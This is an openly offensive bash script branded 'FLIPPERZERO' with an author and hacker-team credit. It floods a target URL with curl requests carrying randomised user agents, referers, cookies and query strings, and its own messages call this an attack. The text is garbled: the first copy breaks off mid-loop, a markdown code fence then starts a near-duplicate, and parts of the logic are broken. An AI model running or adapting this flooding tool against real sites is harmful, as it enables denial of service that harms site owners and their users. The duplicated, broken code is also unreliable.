#!/bin/bash
e="echo -e "
clear
#AUTHOR : HOZOOO
#TEAM : SYSTEM UMBRELLA DRAK9999

usage() {
     
echo -e "\e[34m╭───────────────────────────────────────────────────────────────────────────────────────────╮"

echo -e "\e[34m
\e[31m⠀ ███████╗██╗     ██╗██████╗ ██████╗ ███████╗██████╗ ███████╗███████╗██████╗  ██████╗                        ⠀
 \e[31m ██╔════╝██║     ██║██╔══██╗██╔══██╗██╔════╝██╔══██╗╚══███╔╝██╔════╝██╔══██╗██╔═══██╗                       ⠀
⠀ █████╗  ██║     ██║██████╔╝██████╔╝█████╗  ██████╔╝  ███╔╝ █████╗  ██████╔╝██║   ██║                       ⠀
⠀ ██╔══╝  ██║     ██║██╔═══╝ ██╔═══╝ ██╔══╝  ██╔══██╗ ███╔╝  ██╔══╝  ██╔══██╗██║   ██║                       ⠀
⠀ ██║     ███████╗██║██║     ██║     ███████╗██║  ██║███████╗███████╗██║  ██║╚██████╔╝                       
⠀ ╚═╝     ╚══════╝╚═╝╚═╝     ╚═╝     ╚══════╝╚═╝  ╚═╝╚══════╝╚══════╝╚═╝  ╚═╝ ╚═════╝                        
"
echo -e "\e[34m╰───────────────────────────────────────────────────────────────────────────────────────────╯"

    echo " -c, --clounds Number of concurrent clounds (default: 10)"
    echo " -s, --sockets Number of concurrent sockets (default: 10)"
    echo " -m, --method HTTP method (get, post, random)"
    echo " -u, --useragents File containing user agents"
    echo " -d, --debug Enable debug mode"
    echo "Executor Team Cyber"
}

# Function to handle errors
error() {
    echo "Error: $1"
    usage
    exit 2
}

# Function to generate random user agent
generate_user_agent() {
    local os_names=("Linux x86_64" "Linux i386" "Windows NT 6.1" "Windows NT 6.3" "Windows NT 5.1" "Windows NT.6.2" "Macintosh")
    local os_exts=("X11" "WOW64" "Win64; x64" "Intel Mac OS X $(($RANDOM % 11)).$(($RANDOM % 10)).$(($RANDOM % 6))")
    local platform_names=("AppleWebKit/$(($RANDOM % 3 + 535)).$(($RANDOM % 36 + 1))" "KHTML, like Gecko")
    local platform_exts=("Chrome/$(($RANDOM % 27 + 6)).0.$(($RANDOM % 2000 + 100)).$(($RANDOM % 100)).Safari/$(($RANDOM % 3 + 535)).$(($RANDOM % 36 + 1))" "Version/$(($RANDOM % 3 + 4)).$(($RANDOM % 2)).$(($RANDOM % 10)).Safari/$(($RANDOM % 3 + 535)).$(($RANDOM % 36 + 1))")
    local browser_info=("MSIE 6.0" "MSIE 6.1" "MSIE 7.0" "MSIE 7.0b" "MSIE 8.0" "MSIE 9.0" "MSIE 10.0")
    local browser_ext_pre=("compatible" "Windows; U")
    local browser_ext_post=("Trident/$(($RANDOM % 2 + 4)).0" ".NET CLR $(($RANDOM % 3 + 1)).$(($RANDOM % 6)).$(($RANDOM % 30000 + 1000))")
    local gecko_names=("Gecko/$(($RANDOM % 10 + 2001))$(($RANDOM % 31 + 1))$(($RANDOM % 12 + 1)) Firefox/$(($RANDOM % 16 + 10)).0")

    local os_name=${os_names[$RANDOM % ${#os_names[@]}]}
    local os_ext=${os_exts[$RANDOM % ${#os_exts[@]}]}
    local platform_name=${platform_names[$RANDOM % ${#platform_names[@]}]}
    local platform_ext=${platform_exts[$RANDOM % ${#platform_exts[@]}]}
    local browser_info_name=${browser_info[$RANDOM % ${#browser_info[@]}]}
    local browser_ext_pre_name=${browser_ext_pre[$RANDOM % ${#browser_ext_pre[@]}]}
    local browser_ext_post_name=${browser_ext_post[$RANDOM % ${#browser_ext_post[@]}]}
    local gecko_name=${gecko_names[$RANDOM % ${#gecko_names[@]}]}

    local ua_string="Mozilla/5.0 ($os_name; $os_ext) $platform_name $platform_ext $browser_info_name $browser_ext_pre_name $browser_ext_post_name $gecko_name"
    echo $ua_string
}

# Function to generate random headers
generate_random_headers() {
    local no_cache_directives=("no-cache" "max-age=0")
    local accept_encoding=("" "*" "identity" "gzip" "deflate")
    local accept_charset=("ISO-8859-1" "utf-8" "Windows-1251" "ISO-8859-2" "ISO-8859-15")
    local referers=("http://www.google.com/" "http://www.bing.com/" "http://www.baidu.com/" "http://www.yandex.com/" "http://www.yahoo.com/" "http://www.globo.com/" "http://www.pastebin.com/" "https://www.nasa.gov/" "https://www.facebook.com/" "http://www.chris.com/" "http://www.retrojunkie.com/" "http://www.usatoday.com/" "http://www.engadget.search.aol.com/" "http://www.ask.com/" "http://www.sogou.com/" "http://www.zhongsou.com/" "http://www.dmoz.org/")

    local no_cache=$(printf "%s, " "${no_cache_directives[@]}" | sed 's/, $//')
    local accept_encoding=$(printf "%s, " "${accept_encoding[@]}" | sed 's/, $//')
    local accept_charset=$(printf "%s, " "${accept_charset[@]}" | sed 's/, $//')
    local referer=$(printf "%s" "${referers[@]}" | sed 's/ /, /g')

    local headers=(
        "User-Agent: $(generate_user_agent)"
        "Cache-Control: $no_cache"
        "Accept-Encoding: $accept_encoding"
        "Connection: keep-alive"
        "Keep-Alive: $(($RANDOM % 1000 + 1))"
        "Host: $HOST"
    )

    if [ $(($RANDOM % 2)) -eq 0 ]; then
        headers+=("Accept-Charset: ${accept_charset[0]},${accept_charset[1]};q=$(printf "%.1f" $RANDOM);q=$(printf "%.1f" $RANDOM)")
    fi

    if [ $(($RANDOM % 2)) -eq 0 ]; then
        local url_part=$(head /dev/urandom | tr -dc A-Za-z0-9 | head -c $(($RANDOM % 10 + 5)))
        local random_referer="${referers[$RANDOM % ${#referers[@]}]}$url_part"
        if [ $(($RANDOM % 2)) -eq 0 ]; then
            random_referer+="?$(generate_query_string $(($RANDOM % 10 + 1)))"
        fi
        headers+=("Referer: $random_referer")
    fi

    if [ $(($RANDOM % 2)) -eq 0 ]; then
        headers+=("Content-Type: $(printf "%s" "multipart/form-data" "application/x-url-encoded" | sed 's/ /, /g')")
    fi

    if [ $(($RANDOM % 2)) -eq 0 ]; then
        headers+=("Cookie: $(generate_query_string $(($RANDOM % 5 + 1)))")
    fi

    echo "${headers[@]}"
}

# Function to generate query string
generate_query_string() {
    local ammount=$1
    local query_string=""
    for ((i=0; i<ammount; i++)); do
        local key=$(head /dev/urandom | tr -dc A-Za-z0-9 | head -c $(($RANDOM % 10 + 3)))
        local value=$(head /dev/urandom | tr -dc A-Za-z0-9 | head -c $(($RANDOM % 20 + 3)))
        query_string+="${key}=${value}&"
    done
    echo "${query_string%&}"
}

# Function to generate request URL
generate_request_url() {
    local param_joiner="?"
    if [[ $URL == *?* ]]; then
        param_joiner="&"
    fi
    echo "$URL$param_joiner$(generate_query_string $(($RANDOM % 5 + 1)))"
}

# Function to perform the attack
attack() {
    local url=$1
    local clounds=$2
    local sockets=$3
    local method=$4

    for ((i=0; i<clounds; i++)); do
        for ((j=0; j<sockets; j++)); do
```bash
#!/bin/bash


# Function to display usage information
usage() {
    echo -e "\e[34m╭───────────────────────────────────────────────────────────────────────────────────────────╮"

echo -e "\e[34m
\e[31m⠀ ███████╗██╗     ██╗██████╗ ██████╗ ███████╗██████╗ ███████╗███████╗██████╗  ██████╗                        ⠀
 \e[31m ██╔════╝██║     ██║██╔══██╗██╔══██╗██╔════╝██╔══██╗╚══███╔╝██╔════╝██╔══██╗██╔═══██╗                       ⠀
⠀ █████╗  ██║     ██║██████╔╝██████╔╝█████╗  ██████╔╝  ███╔╝ █████╗  ██████╔╝██║   ██║                       ⠀
⠀ ██╔══╝  ██║     ██║██╔═══╝ ██╔═══╝ ██╔══╝  ██╔══██╗ ███╔╝  ██╔══╝  ██╔══██╗██║   ██║                       ⠀
⠀ ██║     ███████╗██║██║     ██║     ███████╗██║  ██║███████╗███████╗██║  ██║╚██████╔╝                       
⠀ ╚═╝     ╚══════╝╚═╝╚═╝     ╚═╝     ╚══════╝╚═╝  ╚═╝╚══════╝╚══════╝╚═╝  ╚═╝ ╚═════╝                        
"
echo -e "\e[34m╰───────────────────────────────────────────────────────────────────────────────────────────╯"

    echo " -c, --clounds Number of concurrent clounds (default: 10)"
    echo " -s, --sockets Number of concurrent sockets (default: 10)"
    echo " -m, --method HTTP method (get, post, random)"
    echo " -u, --useragents File containing user agents"
    echo " -d, --debug Enable debug mode"
    
}

# Function to handle errors
error() {
    echo "Error: $1"
    usage
    exit 2
}

# Function to generate random user agent
generate_user_agent() {
    local os_names=("Linux x86_64" "Linux i386" "Windows NT 6.1" "Windows NT 6.3" "Windows NT 5.1" "Windows NT.6.2" "Macintosh")
    local os_exts=("X11" "WOW64" "Win64; x64" "Intel Mac OS X $(($RANDOM % 11)).$(($RANDOM % 10)).$(($RANDOM % 6))")
    local platform_names=("AppleWebKit/$(($RANDOM % 3 + 535)).$(($RANDOM % 36 + 1))" "KHTML, like Gecko")
    local platform_exts=("Chrome/$(($RANDOM % 27 + 6)).0.$(($RANDOM % 2000 + 100)).$(($RANDOM % 100)).Safari/$(($RANDOM % 3 + 535)).$(($RANDOM % 36 + 1))" "Version/$(($RANDOM % 3 + 4)).$(($RANDOM % 2)).$(($RANDOM % 10)).Safari/$(($RANDOM % 3 + 535)).$(($RANDOM % 36 + 1))")
    local browser_info=("MSIE 6.0" "MSIE 6.1" "MSIE 7.0" "MSIE 7.0b" "MSIE 8.0" "MSIE 9.0" "MSIE 10.0")
    local browser_ext_pre=("compatible" "Windows; U")
    local browser_ext_post=("Trident/$(($RANDOM % 2 + 4)).0" ".NET CLR $(($RANDOM % 3 + 1)).$(($RANDOM % 6)).$(($RANDOM % 30000 + 1000))")
    local gecko_names=("Gecko/$(($RANDOM % 10 + 2001))$(($RANDOM % 31 + 1))$(($RANDOM % 12 + 1)) Firefox/$(($RANDOM % 16 + 10)).0")

    local os_name=${os_names[$RANDOM % ${#os_names[@]}]}
    local os_ext=${os_exts[$RANDOM % ${#os_exts[@]}]}
    local platform_name=${platform_names[$RANDOM % ${#platform_names[@]}]}
    local platform_ext=${platform_exts[$RANDOM % ${#platform_exts[@]}]}
    local browser_info_name=${browser_info[$RANDOM % ${#browser_info[@]}]}
    local browser_ext_pre_name=${browser_ext_pre[$RANDOM % ${#browser_ext_pre[@]}]}
    local browser_ext_post_name=${browser_ext_post[$RANDOM % ${#browser_ext_post[@]}]}
    local gecko_name=${gecko_names[$RANDOM % ${#gecko_names[@]}]}

    local ua_string="Mozilla/5.0 ($os_name; $os_ext) $platform_name $platform_ext $browser_info_name $browser_ext_pre_name $browser_ext_post_name $gecko_name"
    echo $ua_string
}

# Function to generate random headers
generate_random_headers() {
    local no_cache_directives=("no-cache" "max-age=0")
    local accept_encoding=("" "*" "identity" "gzip" "deflate")
    local accept_charset=("ISO-8859-1" "utf-8" "Windows-1251" "ISO-8859-2" "ISO-8859-15")
    local referers=("http://www.google.com/" "http://www.bing.com/" "http://www.baidu.com/" "http://www.yandex.com/" "http://www.yahoo.com/" "http://www.globo.com/" "http://www.pastebin.com/" "https://www.nasa.gov/" "https://www.facebook.com/" "http://www.chris.com/" "http://www.retrojunkie.com/" "http://www.usatoday.com/" "http://www.engadget.search.aol.com/" "http://www.ask.com/" "http://www.sogou.com/" "http://www.zhongsou.com/" "http://www.dmoz.org/")

    local no_cache=$(printf "%s, " "${no_cache_directives[@]}" | sed 's/, $//')
    local accept_encoding=$(printf "%s, " "${accept_encoding[@]}" | sed 's/, $//')
    local accept_charset=$(printf "%s, " "${accept_charset[@]}" | sed 's/, $//')
    local referer=$(printf "%s" "${referers[@]}" | sed 's/ /, /g')

    local headers=(
        "User-Agent: $(generate_user_agent)"
        "Cache-Control: $no_cache"
        "Accept-Encoding: $accept_encoding"
        "Connection: keep-alive"
        "Keep-Alive: $(($RANDOM % 1000 + 1))"
        "Host: $HOST"
    )

    if [ $(($RANDOM % 2)) -eq 0 ]; then
        headers+=("Accept-Charset: ${accept_charset[0]},${accept_charset[1]};q=$(printf "%.1f" $RANDOM);q=$(printf "%.1f" $RANDOM)")
    fi

    if [ $(($RANDOM % 2)) -eq 0 ]; then
        local url_part=$(head /dev/urandom | tr -dc A-Za-z0-9 | head -c $(($RANDOM % 10 + 5)))
        local random_referer="${referers[$RANDOM % ${#referers[@]}]}$url_part"
        if [ $(($RANDOM % 2)) -eq 0 ]; then
            random_referer+="?$(generate_query_string $(($RANDOM % 10 + 1)))"
        fi
        headers+=("Referer: $random_referer")
    fi

    if [ $(($RANDOM % 2)) -eq 0 ]; then
        headers+=("Content-Type: $(printf "%s" "multipart/form-data" "application/x-url-encoded" | sed 's/ /, /g')")
    fi

    if [ $(($RANDOM % 2)) -eq 0 ]; then
        headers+=("Cookie: $(generate_query_string $(($RANDOM % 5 + 1)))")
    fi

    echo "${headers[@]}"
}

# Function to generate query string
generate_query_string() {
    local ammount=$1
    local query_string=""
    for ((i=0; i<ammount; i++)); do
        local key=$(head /dev/urandom | tr -dc A-Za-z0-9 | head -c $(($RANDOM % 10 + 3)))
        local value=$(head /dev/urandom | tr -dc A-Za-z0-9 | head -c $(($RANDOM % 20 + 3)))
        query_string+="${key}=${value}&"
    done
    echo "${query_string%&}"
}

# Function to generate request URL
generate_request_url() {
    local param_joiner="?"
    if [[ $URL == *?* ]]; then
        param_joiner="&"
    fi
    echo "$URL$param_joiner$(generate_query_string $(($RANDOM % 5 + 1)))"
}

# Function to perform the attack
attack() {
    local url=$1
    local clounds=$2
    local sockets=$3
    local method=$4

    for ((i=0; i<clounds; i++)); do
        for ((j=0; j<sockets; j++)); do
            local headers=$(generate_random_headers)
            local request_url=$(generate_request_url)

            if [ "$method" == "random" ]; then
                method=$(printf "%s" "GET" "POST" | sed 's/ /, /g')
            fi

            curl -s -o /dev/null -w "%{http_code}\n" -X $method $request_url -H "$headers"
        done
    done
}

# Main function
main() {
    local url=$1
    local clounds=10
    local sockets=10
    local method="GET"
    local uas_file=""
    local debug=false

    shift
    while [[ $# -gt 0 ]]; do
        case $1 in
            -h|--help)
                usage
                exit 0
                ;;
            -u|--useragents)
                uas_file=$2
                shift
                ;;
            -s|--sockets)
                sockets=$2
                shift
                ;;
            -c|--clounds)
                clounds=$2
                shift
                ;;
            -d|--debug)
                debug=true
                ;;
            -m|--method)
                method=$2
                shift
                ;;
            *)
                error "Invalid option: $1"
                ;;
        esac
        shift
    done

    if [ -z "$url" ]; then
        error "Please provide a URL to start the attack"
    fi

    if [[ ! $url =~ ^http ]]; then
        error "Invalid URL supplied"
    fi

    if [ -n "$uas_file" ]; then
        if [ ! -f "$uas_file" ]; then
            error "User agents file not found: $uas_file"
        fi
        useragents=$(cat "$uas_file")
    fi

    HOST=$(echo $url | awk -F[/:] '{print $4}')
    attack "$url" "$clounds" "$sockets" "$method"
}

# Check if the script is being run directly
if [[ "${BASH_SOURCE[0]}" == "${0}" ]]; then
    main "$@"
fi
